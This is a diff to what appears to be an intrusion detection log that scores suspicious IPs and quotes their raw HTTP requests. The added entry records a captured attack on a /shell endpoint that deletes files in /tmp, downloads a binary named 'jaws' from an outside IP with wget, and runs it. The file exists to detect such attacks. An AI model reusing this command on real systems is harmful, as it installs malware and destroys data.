@@ -1893,3 +1893,8 @@ IP: 104.152.52.112 | Level: CRITICAL 🚨 | Score: 250
 IP: 104.152.52.120 | Level: CRITICAL 🚨 | Score: 460
   Reason: Method(MALFORMED):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
   RawLog: 104.152.52.120 - - [27/May/2026:23:21:30 +0000] "\x00\x01\x00\x0C!\x12\xA4B\xFB/\xF1*\xAD\xFD`V\xFF\x8F\x0E\xA3\x80\x22\x00\x00\x80(\x00\x04\x00\x07v\x12" 400 157 "-" "-" "-"
+
+--- Update 2026-05-27T23:30:23.570497 ---
+IP: 200.8.235.50 | Level: CRITICAL 🚨 | Score: 205
+  Reason: QueryMatch(wget):+80, QueryMatch(/tmp):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 200.8.235.50 - - [27/May/2026:23:26:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 203.145.34.131/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 157 "-" "-" "-"
